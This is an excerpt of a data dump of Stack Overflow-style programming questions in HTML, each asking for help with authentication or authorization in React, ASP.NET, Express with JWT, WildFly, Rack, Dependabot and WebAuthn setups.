I am getting perfect results in the postman. Both of those paths use &quot;isAuthorized&quot; middleware. In client side i am getting error not authorized for &quot;/api/v1/users/chats&quot; but the other path is perfectly working since its getting cookies in its request header</p>
<p>In client side, the &quot;get /api/v1/users/chats&quot; path must run as expected and there must be a cookie section in the request header, just like &quot;post /prompts/create&quot; path</p>
"
"<p>I'm facing a problem to give authorization to the users based on their roles, the users are admin, patient, doctor, and hospital. I'm done with the authentication and any user can login in into the system with his username and password. Also, I'm handling the validation. Now I want to redirect the user based on his username for example ( if username === 'doctor' -&gt; Navigate to  else if username === 'patient' Navigate to  (RootLayout is a wrap component it has the navbar at the top and under it is the  where the child routes should be rendered else if username === 'admin' Navigate to  else if username === 'hospital' Navigate to  )
Also the problem is that someone told me that I can't do it with role based because the backend has more than one schema so I can not use this method.
Could anyone help me to find a way to give authorization to the users?</p>
<p>I don't know how to do it but I've done many search on it and I found 2 approaches which are ContextAPI and Role-Based but I couldn't do it</p>
<p>here is the code:</p>
<p>App.jsx</p>
<pre><code>import { createBrowserRouter, RouterProvider } from &quot;react-router-dom&quot;;
import RootLayout from &quot;./root/RootLayout&quot;;
import Home from &quot;./pages/Home&quot;;
import Error from &quot;./Error/Error&quot;;
import ContactUs from &quot;./pages/ContactUs.jsx&quot;;
import NewLogin from &quot;./pages/NewLogin.jsx&quot;;
import { loader as tokenLoader } from &quot;./util/auth.js&quot;;
import { action as authAction } from &quot;./pages/NewLogin.jsx&quot;;
import { action as logoutAction } from &quot;./pages/Logout.js&quot;;
import Nutrition from &quot;./health/Nutrition.jsx&quot;;
import HealthAwareness from &quot;./health/HealthAwareness.jsx&quot;;

const router = createBrowserRouter([
  {
    path: &quot;/&quot;,
    element: &lt;RootLayout /&gt;,
    errorElement: &lt;Error /&gt;,
    id: &quot;root&quot;,
    loader: tokenLoader,
    children: [
      { path: &quot;&quot;, element: &lt;Home /&gt; },
      { path: &quot;health-awareness&quot;, element: &lt;HealthAwareness /&gt; },
      { path: &quot;ca&quot;, element: &lt;Nutrition /&gt; },
      { path: &quot;contact-us&quot;, element: &lt;ContactUs /&gt; },
      { path: &quot;logout&quot;, action: logoutAction },
    ],
  },
  { path: &quot;login&quot;, element: &lt;NewLogin /&gt;, action: authAction },
]);

export default function App() {
  return &lt;RouterProvider router={router} /&gt;;
}
</code></pre>
<p>RootLayout.jsx</p>
<pre><code>import { Outlet } from &quot;react-router-dom&quot;;

import NewNavbar from &quot;../components/NewNavbar.jsx&quot;;

export default function RootLayout() {
  return (
    &lt;&gt;
      &lt;NewNavbar /&gt;
      &lt;main&gt;
        &lt;Outlet /&gt;
      &lt;/main&gt;
    &lt;/&gt;
  );
}
</code></pre>
<p>Authentication handling is in NewLogin.jsx</p>
<pre><code>import { json, redirect } from &quot;react-router-dom&quot;;
import LoginForm from &quot;../components/LoginForm&quot;;

export async function action({ request }) {
  const data = await request.formData();
  const authData = {
    username: data.get(&quot;username&quot;),
    password: data.get(&quot;password&quot;),
  };

  const response = await fetch(&quot;http://localhost:3000/auth/login&quot;, {
    method: &quot;POST&quot;,
    headers: {
      &quot;Content-Type&quot;: &quot;application/json&quot;,
    },
    body: JSON.stringify(authData),
  });

  if (response.status === 400) {
    return response;
    //throw json({ message: &quot;invalid data&quot; }, { status: 400 });
  }

  if (!response.ok) {
    throw json(
      { message: &quot;Could not authenticate this user.&quot; },
      { status: 400 }
    );
  }

  const resData = await response.json();
  const token = resData.token;

  localStorage.setItem(&quot;token&quot;, token);
  console.log(token);
  return redirect(&quot;/&quot;);
}
</code></pre>
<p>auth.js</p>
<pre><code>export function getAuthToken() {
    const token = localStorage.getItem('token');
    return token;
}

export function loader() {
    return getAuthToken();
}
</code></pre>
<p>Logout.js</p>
<pre><code>import { redirect } from &quot;react-router-dom&quot;;

export function action() {
    localStorage.removeItem('token');
    return redirect('/');
}
</code></pre>
<p>NewNavbar.jsx</p>
<pre><code> function logoutHandler() {
    const proceed = window.confirm(&quot;Are you sure؟&quot;);

    if (proceed) {
      submit(null, { action: &quot;/logout&quot;, method: &quot;post&quot; });
    }
  }

const token = useRouteLoaderData(&quot;root&quot;);  

//inside the navbar
 {!token &amp;&amp; (
            &lt;li
              className={`hidden md:block list-none text-[23px] p-6 hover:animate-pulse ${
                isScrolled ? &quot;text-emerald-800&quot; : &quot;text-slate-100&quot;
              }`}
            &gt;
              &lt;NavLink to=&quot;/login&quot;&gt;login&lt;/NavLink&gt;
            &lt;/li&gt;
          )}
          {token &amp;&amp; (
            &lt;li
              className={`hidden md:block list-none text-[23px] hover:animate-pulse p-6 ${
                isScrolled ? &quot;text-emerald-800&quot; : &quot;text-slate-100&quot;
              }`}
            &gt;
              &lt;Form action=&quot;/logout&quot; method=&quot;post&quot;&gt;
                &lt;button onClick={logoutHandler}&gt;logout&lt;/button&gt;
              &lt;/Form&gt;
            &lt;/li&gt;
          )}
</code></pre>
"
"<p>At its simplest level all I want to do is restrict a razor page to users that are only in a certain AD Group using the inbuilt dot net authorization &amp; authentication objects. My project will not be making use of cookies or anything else.</p>
<p>I've made a new, basic web site with the following code snippets I pulled from the authentication docs. My program.cs:</p>
<pre><code>public static void Main(string[] args)
{
    var builder = WebApplication.CreateBuilder(args);

    // Add services to the container.
    builder.Services.AddRazorPages();
    builder.Services.AddAuthentication(&quot;Test&quot;);
    builder.Services.AddAuthorization(options =&gt;
    {
        options.AddPolicy(&quot;Test&quot;, policy =&gt;
            policy.Requirements.Add(new InCorrectGroupRequirement()));
    });

    var app = builder.Build();

    // Configure the HTTP request pipeline.
    if (!app.Environment.IsDevelopment())
    {
        app.UseExceptionHandler(&quot;/Error&quot;);
        // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
        app.UseHsts();
    }

    app.UseHttpsRedirection();
    app.UseStaticFiles();

    app.UseRouting();

    app.UseAuthentication();
    app.UseAuthorization();

    app.MapRazorPages();

    app.Run();
}
</code></pre>
<p>My authorization handler &amp; requirement classes</p>
<pre><code>public class InCorrectGroupAuthorizationHandler : AuthorizationHandler&lt;InCorrectGroupRequirement&gt;
{
    private readonly IHttpClientFactory _httpClientFactory;

    public InCorrectGroupAuthorizationHandler(IHttpClientFactory httpClientFactory)
    {
        _httpClientFactory = httpClientFactory;
    }

    protected override async Task HandleRequirementAsync(AuthorizationHandlerContext context, InCorrectGroupRequirement requirement)
    {
        var userId = context.User.Identities.First();

        if (userId.IsAuthenticated)
        {
            if (userId.Name == &quot;pass&quot;)
                context.Succeed(requirement);
        }
    }
}

public class InCorrectGroupRequirement : IAuthorizationRequirement
{
}
</code></pre>
<p>Finally the page with the authorize attribute:</p>
<pre><code>[Authorize(Policy = &quot;Test&quot;)]
public class PrivacyModel : PageModel
{
    private readonly ILogger&lt;PrivacyModel&gt; _logger;

    public PrivacyModel(ILogger&lt;PrivacyModel&gt; logger)
    {
        _logger = logger;
    }

    public void OnGet()
    {
    }
}
</code></pre>
<p>Enable windows authentication is also turned on in the launchSettings.json</p>
<p>With the above I was wanting to test &amp; confirm that I had set everything up correctly by checking against my username instead of an ad group. However, when I navigate to the page I'm getting the following message:</p>
<blockquote>
<p>InvalidOperationException: No authenticationScheme was specified, and there was no DefaultChallengeScheme found. The default schemes can be set using either AddAuthentication(string defaultScheme) or AddAuthentication(Action configureOptions).</p>
</blockquote>
<p>I've been at this for a while yet I am unable to get past this error. I thought I was setting up a default with what I've presented but evidently I'm not. Could someone please show me what it is I'm missing, or point me in the direction of some docs that may help me?</p>
<p>The terminology and the multiple ways of doing things is only confusing me more when I try to google something more specific.</p>
"
"<p>i am trying to implement a profile card,using jwt and cookie-parser.it store in browser cookie but when i try to access it from backend it show me undefined.</p>
<p><strong>client Side</strong></p>
<pre><code>  import axios from &quot;axios&quot;;
  export default function useAxiosPublic() {
    const axiosPublic = axios.create({
      baseURL: &quot;http://localhost:5000&quot;,
      withCredentials: false,
    });
    return axiosPublic;
  }
</code></pre>
<p>if i change here <strong>withCredentials true</strong> and another one is</p>
<pre><code>app.use(
  cors({
    origin: &quot;http://localhost:5173&quot;,
    credentials: false,
  })
);
</code></pre>
<p>if i change <strong>crediantials true</strong> then i can access token but as i am using imagebb for upload image then it show me cors policy.</p>
<pre><code>import jwt from &quot;jsonwebtoken&quot;;

export const verifyToken = (req, res, next) =&gt; {
  //   console.log(req);
  const token = req.cookies.token;
  console.log(&quot;res&quot;, token);
  if (!token) {
    return res.status(501).json({ message: &quot;token is not valid&quot; });
  }
  jwt.verify(token, process.env.JWT_SECRET, (err, user) =&gt; {
    if (err) {
      return res.status(401).json({ message: &quot;Unauthorized&quot; });
    }
    req.user = user;
    next();
  });
};

export const userLogin = async (req, res) =&gt; {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ message: &quot;All fields are required&quot; });
  }
  try {
    // const validUser = await User.findOne({ email });
    const validUser = await User.findOne({ email });
    if (!validUser) {
      //   console.log(&quot;user not found&quot;, validUser);
      return res.status(400).json({ message: &quot;No User Found!&quot; });
    }
    // compare with password
    // console.log(validUser);
    // console.log(password);
    // console.log(validUser.password);
    const matchPassword = bycryptjs.compareSync(password, validUser.password);
    // console.log(matchPassword);
    if (!matchPassword) {
      return res.status(400).json({ message: &quot;Invalid credentials&quot; });
    }
    // create a token

    const token = jwt.sign(
      {
        id: validUser._id,
      },
      process.env.JWT_SECRET
    );
    // console.log(token);
    res
      .status(200)
      .cookie(&quot;token&quot;, token, {
        httpOnly: true,
        sameSite: &quot;none&quot;,
        secure: false,
      })
      .json(validUser);
  } catch (error) {
    // console.log(error);
    return res.status(500).json({ message: &quot;Login failed&quot;, error });
  }
};
</code></pre>
<p>thanks for your time and suggestions.</p>
"
"<p>capacitor-oauth2 - I am trying to use this plugin in web , ios &amp; android. This is working fine with web but not workig in android &amp; ios. When i am trying to authenticate, MS auth page opens and I click 'continue' to login with my MS account.</p>
<p>Its not returning any response, its stays on the same screen for long time until the user cancels it.</p>
<p>Has anyone developed this for android &amp; ios using capacitor-oauth2?</p>
"
"<p>I am trying to authorize Dependabot for a private npm package repository stored in the Google Cloud Artifact registry with basic authentication. I created a Service Account and provided repository level read permissions by assigning the <a href=""https://cloud.google.com/artifact-registry/docs/access-control#roles"" rel=""nofollow noreferrer"">Artifact Registry Reader</a> role.</p>
<p>The <code>.github/dependabot.yml</code> looks like this:</p>
<pre class=""lang-yaml prettyprint-override""><code>version: 2
registries:
  my-reg:
    type: npm-registry
    url: &lt;my repo url&gt;
    username: &quot;_json_key_base64&quot;
    password: &quot;${{ secrets.KEY_BASE64}}&quot;

updates:
  - package-ecosystem: &quot;npm&quot;
    registries:
      - my-reg
[...]
</code></pre>
<p>where <code>secrets.KEY_BASE64</code> is the base64 encoded service account key stored as a Dependabot Secret in GitHub (following <a href=""https://docs.github.com/en/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot#storing-credentials-for-dependabot-to-use"" rel=""nofollow noreferrer"">the official documentation</a>).<br />
I got some information about the authentication process from this <a href=""https://stackoverflow.com/a/75608265/23422825"">StackOverflow Answer</a> and <a href=""https://cloud.google.com/artifact-registry/docs/docker/authentication#json-key"" rel=""nofollow noreferrer"">this docker KEY_TYPE example</a>.</p>
<p>I also tried this without the base64 encoding (<code>username: &quot;_json_key&quot;</code>) but the error is still the same: <code>{&quot;error&quot;:&quot;The caller does not have permission.&quot;}</code>.</p>
<p>When I use a temporary token instead of the permanent secret key it works until the token expires:</p>
<pre class=""lang-yaml prettyprint-override""><code>[...]
  my-reg:
    type: npm-registry
    url: &lt;my repo url&gt;
    token: &lt;my temp token&gt;
[...]
</code></pre>
<p>When trying to access it with curl I noticed a similar behaviour. When a token is generated it works:</p>
<pre><code>curl -H &quot;Authorization: Bearer $(gcloud auth print-access-token)&quot; &lt;url&gt;
</code></pre>
<p>but if I try using basic auth:</p>
<pre><code>curl -u _json_key:&lt;unencoded_secret_key&gt; &lt;url&gt;
</code></pre>
<p>or with base64 encoding:</p>
<pre><code>curl -u _json_key_base64:&lt;encoded_secret_key&gt; &lt;url&gt;
</code></pre>
<p>it does not work and results in the error: <code>{&quot;error&quot;:&quot;The caller does not have permission.&quot;}</code>. In both cases I removed all whitespace characters from the service account key.</p>
<p>Even with a <code>.npmrc</code> inside the root of the repository (where <code>package.json</code> is located), like mentioned <a href=""https://docs.github.com/en/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot#:%7E:text=The%20npm%20ecosystem%20requires%20a%20.npmrc%20file%20with%20the%20private%20registry%20URL%20to%20be%20checked%20into%20the%20repository."" rel=""nofollow noreferrer"">here in the dependabot documentation</a>, it still does not work:</p>
<pre><code>@my-reg:registry=&lt;url&gt;
</code></pre>
<p>I tried using a temporary token (works, but unwanted since the token is temporary).<br />
I tried using <code>_json_key</code> username with the unendcoded service account key (does not work).<br />
I tried using <code>_json_key_base64</code> username with the base64 encoded service account key (does not work).<br />
I tried adding the above <code>.npmrc</code> file (does not work).</p>
<p>How can I provide a permanent solution for the Dependabot to authenticate to out private npm registry?</p>
"
"<p>Okay so i have simple application. When the user logs in, i create a token with jwt. I have been using res.cookie() to send the token to the frontend but due to reasons, i can no longer use cookies, How do i use headers to achieve the same goal?</p>
<p>Basically, this is what i want to achieve:</p>
<p>//Login function</p>
<pre><code>const login = async (req, res) =&gt; {
    const {email, password} = req.body
    
    const user = await User.findOne({email})
    if(!user){
        throw new UnauthenticatedError('Invalid credentials')
    }

    const isPasswordCorrect = await user.comparePassword(password)
    if(!isPasswordCorrect){
        throw new UnauthenticatedError('Invalid credentials')
    }

    const token = user.createJWT()
    res.cookie(&quot;token&quot;, token).json(user)     //send token here to the frontend through headers instead of cookies
}
</code></pre>
<p>//Auth middleware to verify the token:</p>
<pre><code>const authMiddleware = async (req, res, next) =&gt; {
    const {token} = req.cookies    //get the token here from the headers instead of cookies

    if(token){
        try{

            const {userId, name} = jwt.verify(token, process.env.JWT_SECRET)
            req.user = {userId, name}  
            next()
        }
        catch(error){
            throw new UnauthenticatedError('Authentication invalid')
        }
    }else{
        throw new UnauthenticatedError('no token')
    }
}
</code></pre>
<p>//Login component on the frontend</p>
<pre><code>const handleLogin = async (e) =&gt; {
        e.preventDefault()
        try {
            const {data} = await axios.post('/auth/login', {email,password})
            successfulNotification('login successful')
            setUser(data)
            setRedirect(true)
        } catch (error) {
            errorNotification('login unsuccessful, please try again later')
            return error
        }        
    }
</code></pre>
"
"<p>I use the npm model &quot;serverless-mysql&quot; together with NextJS to send a request in my middleware to authorize my user to my database.
However, I get this error when a user logs in:</p>
<pre><code>Error: TypeError: Cannot read properties of undefined (reading 'slice')
    at Object.connect (webpack-internal:///(middleware)/./node_modules/serverless-mysql/index.js:97:23)
    at async isSessionValid (webpack-internal:///(middleware)/./src/lib/db.ts:100:5)
    at async isAuthenticated (webpack-internal:///(middleware)/./src/lib/auth.ts:18:10)
</code></pre>
<p>I have already modified the module myself and tried to debug it, but unfortunately without success.</p>
<p>This is my middleware.ts:</p>
<pre><code>import {NextRequest, NextResponse} from &quot;next/server&quot;;
import {isAuthenticated} from &quot;@/lib/auth&quot;;

export function middleware(request: NextRequest) {
    if(!isAuthenticated()) {
        NextResponse.redirect(&quot;/login&quot;);
    } else {
        return request;
    }
}
</code></pre>
<p>This is my auth.ts:</p>
<pre><code>

export async function isAuthenticated() {
    if (!cookies().has(&quot;sessionId&quot;)) {
        return false;
    }
    if (!await isSessionValid(cookies().get(&quot;sessionId&quot;)?.value || &quot;&quot;)) {
        return false;
    }

    return await getUserBySessionId(cookies().get(&quot;sessionId&quot;)?.value || &quot;&quot;) !== null;
}
</code></pre>
<p>And these are my database functions:</p>
<pre><code>export async function isSessionValid(sessionId: string) {
    await mysql.connect();
    let results;
    try {
        results = await mysql.query(
            `SELECT * FROM sessions WHERE id = ?`,
            [sessionId]
        );
        console.log(results);
    } catch (e: any) {
        throw new Error(&quot;Error executing query: &quot; + e.message);
    }
    await mysql.end();
    return results &amp;&amp; results.length &gt; 0;
}

export async function getUserBySessionId(sessionId: string) {
    await mysql.connect().catch(() =&gt; {
        throw new Error(&quot;Error connecting to MySQL&quot;);
    });
    const results = await mysql.query(
        `SELECT users.*
        FROM users 
        JOIN sessions ON users.id = sessions.user_id 
        WHERE sessions.id = ?`,
        [sessionId]
    );
    await mysql.end();
    if (results.length === 0) {
        return null;
    }
    return new User(results[0].name, results[0].role);
}

</code></pre>
"
"<p>We use BASIC authentication for a REST API of a WAR deployment (running in Wildfly 27).
Wildfly has been configured accordingly and web.xml / jboss-web.xml refers to the corresponding application-security-domain in the undertow subsystem:</p>
<p><strong>web.xml</strong></p>
<pre><code>&lt;security-constraint&gt;
  &lt;web-resource-collection&gt;
    &lt;web-resource-name&gt;Secured&lt;/web-resource-name&gt;
      &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
        &lt;http-method&gt;GET&lt;/http-method&gt;
        &lt;http-method&gt;POST&lt;/http-method&gt;
  &lt;/web-resource-collection&gt;
  &lt;auth-constraint&gt;
      &lt;role-name&gt;FooRole&lt;/role-name&gt;
  &lt;/auth-constraint&gt;
  &lt;user-data-constraint&gt;
    &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
  &lt;/user-data-constraint&gt;
&lt;/security-constraint&gt;

&lt;login-config&gt;
  &lt;auth-method&gt;BASIC&lt;/auth-method&gt;
  &lt;realm-name&gt;bar-security-domain&lt;/realm-name&gt;
&lt;/login-config&gt;
</code></pre>
<p><strong>jboss-web.xml</strong></p>
<pre><code>&lt;jboss-web&gt;
  &lt;security-domain&gt;bar-security-domain&lt;/security-domain&gt;
&lt;/jboss-web&gt;
</code></pre>
<p><strong>standalone-full.xml</strong></p>
<pre><code>&lt;application-security-domain name=&quot;bar-security-domain&quot; http-authentication-factory=&quot;foobar-auth&quot;/&gt;
</code></pre>
<p>With that configuration everything works fine (access only with valid user credentials) but what irritated me during the setup:
If a security-domain is specified in web.xml / jboss-web.xml which does not exist as an application-security-domain in the undertow-subsystem (e.g. due to a typo or the security-domain from the elytron-subsystem is mistakenly referenced instead of the application-security-domain from the undertow-subsystem), <strong>the application can be used without any authentication</strong> even thought no default-security-domain is defined in our undertow configuration.</p>
<p><strong>I would expect:</strong></p>
<ul>
<li>An error that the security domain specified in web.xml / jboss-web.xml was not found or at least a warning that a fallback is being used.</li>
<li>That the security domain assigned to the application can be traced in the HAL.
--&gt; I have not been able to find either of these anywhere so far.</li>
</ul>
<p><strong>Questions:</strong></p>
<ul>
<li>Is it possible to determine which security-domain is assigned to
an application in Wildfly at runtime?</li>
<li>Is it a bug or feature that    there is no error/warning in case of
incorrect security domain in    web.xml / jboss-web.xml (e.g. to be
able to flexibly    activate/deactivate the security domain via
configuration in    standalone-full.xml)?</li>
<li>Is there a configuration option to generate    a error/warning in the event of an incorrect security domain in    web.xml / jboss-web.xml?</li>
</ul>
"
"<p>Consider the following code snippet:</p>
<pre class=""lang-rb prettyprint-override""><code>require &quot;sqlite3&quot;

db = SQLite3::Database.new &quot;my.db&quot;
p db.execute(&quot;select * from user where name = ?&quot;, [&quot;my_user_name&quot;])
</code></pre>
<p>This will outut the entry in the database where the user's name is &quot;my_user_name&quot;. This works as intended.</p>
<p>Now consider this code snippet (config.ru):</p>
<pre class=""lang-rb prettyprint-override""><code>require &quot;rack/auth/basic&quot;
require &quot;sqlite3&quot;

use Rack::Auth::Basic, &quot;my authentication&quot; do |username, password|
  p username
  p db.execute(&quot;select * from user where name = ?&quot;, [username])
end

run do |env|
  [200, {}, []]
end
</code></pre>
<p>When I send a request to this server:</p>
<pre class=""lang-bash prettyprint-override""><code>curl -X POST -v -ujomy:abc123 localhost:9292 -d ''
</code></pre>
<p>I see the following output in the terminal where I started the server (using rackup):</p>
<pre><code>&quot;my_user_name&quot;
[]
</code></pre>
<p>So I now do not get a result back from my sql query.</p>
<p>When I insert this line before the db.execute statement:</p>
<pre class=""lang-rb prettyprint-override""><code>username = &quot;my_user_name&quot;
</code></pre>
<p>Now I actually get a result back.</p>
<p>Replacing <code>username</code> with <code>username.to_s</code> also does not work.</p>
<p>So it seems that using the username variable provided by Rack does not work with sqlite? How is this even possible as <code>username.class</code> is <code>String</code>? The <code>username.size</code> is equal to <code>&quot;my_user_name&quot;.size</code> too.</p>
"
"<p>In my application I've a problem with the login system. I'm done with the authentication, but I've 4 different users (patient, doctor, admin, hospital), I want to give authorization based on the user value. if the user === 'doctor' -&gt; Navigate to='/doctor-dashboard', and so on. my question here is how to give authorization to each user after he logs in</p>
<p>I don't know how to give authorization, but I'm using react-router-dom v6.21.1</p>
"
"<p>After login API I used 3 other APIs with jwt token coming from login API but one of the APIs returned an unauthorized error and my app stopped the login process.</p>
<p>I first thought the token was not properly set but then I copied the curl of that API and hit it in Postman it successfully returned.
this doesn't come with same API every time for ex:</p>
<p>case 1
LOGIN API: SUCCESS
SOME API: 401</p>
<p>case 2
LOGIN API: SUCCESS
SOME API: SUCCESS
SOME OTHER API: 401</p>
<p>case 3
LOGIN API: SUCCESS
SOME API: SUCCESS
SOME OTHER API: SUCCESS
SOME OTHER API 2: 401</p>
<p>it only happens with api that runs continuously after login API.</p>
<p>It only occurs 1 out 5 times and 401 can be returned from any of 3 APIs which hit just after login API.</p>
<p>I didn't change anything on the server side and it started happening recently.
How can I fix it?</p>
"
"<p>I am currently in the development phase of my project, where the client (react) is hosted at localhost:3000, and the server (laravel) is hosted at localhost:8000. I'm implementing CSRF protection, and I'm curious about its effectiveness in a setup where the client and server are on separate servers and I'm using PAT token-based authentication instead of a session-based.</p>
<p>Do CSRF tokens work effectively in such scenario?</p>
<p>If they do, what steps should I take to ensure CSRF protection functions properly in my specific setup?</p>
<p>I appreciate any insights or guidance!</p>
"
"<p>I am applying authentication to my mern stack application and i am referencing this website on how to do it: <a href=""https://codeculturepro.medium.com/5-simple-steps-for-authentication-and-authorization-in-mern-stack-952fa31fe2ae"" rel=""nofollow noreferrer"">https://codeculturepro.medium.com/5-simple-steps-for-authentication-and-authorization-in-mern-stack-952fa31fe2ae</a></p>
<p>I am sending the created token as so:</p>
<pre><code>const login = async (req, res) =&gt; {
    //token created here

    res.json(token)
}
</code></pre>
<p>I am verifying the token as so:</p>
<pre><code>const authMiddleware = async (req, res, next) =&gt; {

const token = req.headers.authorization.split(' ')[1];

if(token){
    try{

        const {userId, name} = jwt.verify(token, process.env.JWT_SECRET)
        req.user = {userId, name}  
        next()
    }
    catch(error){
        throw new UnauthenticatedError('Authentication invalid')
    }
}else{
    throw new UnauthenticatedError('no token')
}
}
</code></pre>
<p>Since the website didnt reference how to pass the token into headers on the frontend side, even after researching i am still confused, how do i go about this?</p>
"
"<p>I'm trying to implement WebAuthn authentication on my website. Users can register several authenticators (e.g. laptop, tablet, smartphone), and use each one for login. All those registered authenticators are stored in a database, and that is how I identify the user during the login process.</p>
<p>However, I ran into a problem when the user manually removes website credentials in his authenticator (e.g. you can enter into your iCloud and remove specific credentials). In such case, the user can't re-register the same device again (because during the registration process server specifies <code>excludeCredentials</code> field). Also, user cant login into the system on that device because he removed the credentials and server does not know that.</p>
<p>Are there ways to solve this?</p>
"
"<p>I created a web app from scratch using the default .Net template for MVC (ASP.NET Core web app) using Auth with &quot;Individual Accounts&quot; option and SDK 8, and my problem is I'm not able to authenticate a user, at least <code>SignInManager.IsSignedIn(User)</code> always returns false.</p>
<p><code>Program.cs</code>:</p>
<pre><code>var builder = WebApplication.CreateBuilder(args);

// Add services to the container.
var connectionString = builder.Configuration.GetConnectionString(&quot;DefaultConnection&quot;) ?? throw new InvalidOperationException(&quot;Connection string 'DefaultConnection' not found.&quot;);

builder.Services.AddDbContext&lt;ApplicationDbContext&gt;(options =&gt;
    options.UseSqlServer(connectionString));
builder.Services.AddDatabaseDeveloperPageExceptionFilter();

builder.Services.AddDefaultIdentity&lt;IdentityUser&gt;()
    .AddEntityFrameworkStores&lt;ApplicationDbContext&gt;();

builder.Services.AddControllersWithViews();

var app = builder.Build();

// Configure the HTTP request pipeline.
if (app.Environment.IsDevelopment())
{
    app.UseMigrationsEndPoint();
}
else
{
    app.UseExceptionHandler(&quot;/Home/Error&quot;);
    // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
    app.UseHsts();
}

app.UseHttpsRedirection();
app.UseStaticFiles();

app.UseRouting();

app.UseAuthorization();
app.UseAuthentication();

app.MapControllerRoute(
    name: &quot;default&quot;,
    pattern: &quot;{controller=Home}/{action=Index}/{id?}&quot;);
app.MapRazorPages();

app.Run();
</code></pre>
<p><code>Login.cshtml.cs</code>:</p>
<pre><code>public async Task&lt;IActionResult&gt; OnPostAsync(string returnUrl = null)
{
    returnUrl ??= Url.Content(&quot;~/&quot;);

    ExternalLogins = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();

    if (ModelState.IsValid)
    {
        // This doesn't count login failures towards account lockout
        // To enable password failures to trigger account lockout, set lockoutOnFailure: true
        //var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Input.RememberMe, lockoutOnFailure: false);

        var result = SignInResult.Failed;
        AWS_Manager aws = new AWS_Manager(TestController.access_id, TestController.secret_key);

        UserModel oUser = await Task.Run(() =&gt; aws.getUser(Input.Email));

        if (oUser != null)
        {
            if (oUser.Password == Crypto.GetSHA1(Input.Password)))
            {
                SetUser(Input.Email);
                result = SignInResult.Success;
            }
        }

        if (result.Succeeded)
        {
            _logger.LogInformation(&quot;User logged in.&quot;);
            return LocalRedirect(returnUrl);
        }

        if (result.RequiresTwoFactor)
        {
            return RedirectToPage(&quot;./LoginWith2fa&quot;, new { ReturnUrl = returnUrl, RememberMe = Input.RememberMe });
        }

        if (result.IsLockedOut)
        {
            _logger.LogWarning(&quot;User account locked out.&quot;);
            return RedirectToPage(&quot;./Lockout&quot;);
        }
        else
        {
            ModelState.AddModelError(string.Empty, &quot;Invalid login attempt.&quot;);
            return Page();
        }
    }

    // If we got this far, something failed, redisplay form
    return Page();
}
</code></pre>
<p><code>SetUser</code>:</p>
<pre><code>private void SetUser(string email)
{
    var claims = new ClaimsIdentity(
        new[] { 
            // adding following 2 claim just for supporting default antiforgery provider
            new Claim(ClaimTypes.NameIdentifier, email),
            new Claim(&quot;http://schemas.microsoft.com/accesscontrolservice/2010/07/claims/identityprovider&quot;,
            &quot;ASP.NET Identity&quot;, &quot;http://www.w3.org/2001/XMLSchema#string&quot;),
            new Claim(ClaimTypes.Name, email),

            // optionally you could add roles if any
            // new Claim(ClaimTypes.Role, &quot;RoleName&quot;),
            // new Claim(ClaimTypes.Role, &quot;AnotherRole&quot;),

        }, IdentityConstants.ApplicationScheme);

    var claim = new ClaimsPrincipal(claims);
    HttpContext.SignInAsync(claim);

    //This next line is for testing and returns true
    var isLoggenIn = claim.Identities != null &amp;&amp; claim.Identities.Any(i =&gt; i.AuthenticationType == IdentityConstants.ApplicationScheme); //=&gt; Returns true
}
</code></pre>
<p><code>_LoginPartial.cshtml</code>:</p>
<pre><code>@using Microsoft.AspNetCore.Identity
@inject SignInManager&lt;IdentityUser&gt; SignInManager
@inject UserManager&lt;IdentityUser&gt; UserManager

&lt;ul class=&quot;navbar-nav&quot;&gt;
@if (SignInManager.IsSignedIn(User)) //=&gt; Always returns false
{
    &lt;li class=&quot;nav-item&quot;&gt;
        &lt;a  class=&quot;nav-link text-dark&quot; asp-area=&quot;Identity&quot; asp-page=&quot;/Account/Manage/Index&quot; title=&quot;Manage&quot;&gt;Hello @User.Identity?.Name!&lt;/a&gt;
    &lt;/li&gt;
    &lt;li class=&quot;nav-item&quot;&gt;
        &lt;form  class=&quot;form-inline&quot; asp-area=&quot;Identity&quot; asp-page=&quot;/Account/Logout&quot; asp-route-returnUrl=&quot;@Url.Action(&quot;Index&quot;, &quot;Home&quot;, new { area = &quot;&quot; })&quot;&gt;
            &lt;button  type=&quot;submit&quot; class=&quot;nav-link btn btn-link text-dark&quot;&gt;Logout&lt;/button&gt;
        &lt;/form&gt;
    &lt;/li&gt;
}
else
{
    &lt;li class=&quot;nav-item&quot;&gt;
        &lt;a class=&quot;nav-link text-dark&quot; asp-area=&quot;Identity&quot; asp-page=&quot;/Account/Register&quot;&gt;Register&lt;/a&gt;
    &lt;/li&gt;
    &lt;li class=&quot;nav-item&quot;&gt;
        &lt;a class=&quot;nav-link text-dark&quot; asp-area=&quot;Identity&quot; asp-page=&quot;/Account/Login&quot;&gt;Login&lt;/a&gt;
    &lt;/li&gt;
}
&lt;/ul&gt;
</code></pre>
<p>As per all the threads / posts I've already read I believe my problem is in <code>SetUser</code> method, and most precisely in setting the <code>AuthenticationType</code> in the claims, but not completely sure, and I don't know how to do it.</p>
<p>Any help?</p>
<p>Edit 1:</p>
<p>I'm quite sure I should add the AuthenticationType at the end of the</p>
<pre><code>ClaimsIdentity constructor, like this (for example):
            var claims = new ClaimsIdentity(
                new[] { 
                    // adding following 2 claim just for supporting default antiforgery provider
                    new Claim(ClaimTypes.NameIdentifier, email),
                    new Claim(&quot;http://schemas.microsoft.com/accesscontrolservice/2010/07/claims/identityprovider&quot;,
                    &quot;ASP.NET Identity&quot;, &quot;http://www.w3.org/2001/XMLSchema#string&quot;),
                    new Claim(ClaimTypes.Name, email),

                    // optionally you could add roles if any
                    // new Claim(ClaimTypes.Role, &quot;RoleName&quot;),
                    // new Claim(ClaimTypes.Role, &quot;AnotherRole&quot;),

                }, &quot;UserAuthenticated&quot;);
</code></pre>
<p>But then I don't know where / how to specify the &quot;UserAuthenticated&quot; AuthenticationType.</p>
"
"<p>I have this code (html):</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta charset=&quot;UTF-8&quot;&gt;
